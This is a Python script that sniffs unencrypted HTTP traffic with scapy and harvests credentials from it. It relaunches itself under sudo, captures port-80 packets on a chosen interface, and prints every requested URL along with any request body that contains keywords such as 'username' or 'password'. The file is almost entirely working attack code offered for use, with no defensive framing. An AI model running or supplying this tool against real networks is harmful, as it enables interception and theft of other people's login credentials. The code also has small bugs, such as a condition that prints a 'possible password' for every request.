import scapy.all as scapy
import os
import sys
from scapy_http import http
import netifaces

def become_root():
    euid = os.geteuid()
    if euid != 0:
        print("Script not started as root. Running sudo..")
        args = ['sudo', sys.executable] + sys.argv + [os.environ]
        os.execlpe('sudo', *args)

    print('Running. Your euid is', + euid)
    print("---------------------------------------------------------")


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=processed_sniffed_packet, filter="port 80")


def geturl(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["username", "uname", "password", "email", "pass", "login"]
        for keyword in keywords:
            if keyword in load:
                return load


def processed_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = str(geturl(packet))
        print("[+] HTTP Requests -->" + url)
        login_info = str(get_login(packet))
        if login_info:
            print("\n\n[+] Possible Username/Password -->" + login_info + "\n\n")


def run_sniff():
    become_root()
    interfaces = netifaces.interfaces()
    print("Available Interfaces :")
    print(interfaces)
    interface = input("Enter the interface ")
    if interface not in interfaces:
        print("Pleas Enter a valid Interface!!")
    else:
        print("Sniffing.........")
        sniff(interface)

